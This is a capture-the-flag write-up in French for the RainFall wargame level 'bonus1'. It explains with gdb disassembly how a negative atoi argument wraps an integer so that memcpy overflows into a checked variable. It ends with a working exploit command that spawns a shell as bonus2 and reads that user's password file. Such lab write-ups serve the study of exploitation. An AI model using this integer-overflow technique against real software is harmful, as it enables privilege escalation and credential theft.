En desassemblant le binaire, on voit qu'il ya plusieurs verification dans le code avant d'atteindre le execl de "/bin/sh".

Il y a tout d'abord le atoi qui verifie si av[1] est inferieur à 10
```gdb
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
```

La valeur de retour de atoi est multiplié par 4 et ensuite elle est utilisé dans le memcpy pour copier le contenu de av[2] dans la string s déclaré au début du main

```gdb
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
```
La valeur de retour de atoi est ensuite comparer a 0x574f4c46 est si c'est égal on accede au shell avec les doits de bonus2

```gdb
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
```

Ici il faut contourner atoi mais aussi memcpy afin d'ecrire dans r qui est la valeur de retour de atoi * 4.

Pour ça on passe un nombre négatif qui va passer la premiere vérification qui ensuite sera multiplié par 4 pour être utilisé par memcpy.
Vu que  atoi stock dans un int on peux utilisé la notion de retour a zero des variables signé pour tomber sur 44 une fois r multiplié par 4.

Après de multiples recherche on tombe sur -1073741813

s == 40 + r == 4 == 44

40 * 'B' + '0x574f4c46' pour override r et le faire correspondre avec la derniere condition avant le execl
```gdb
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
```

```bash
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
...
...
```

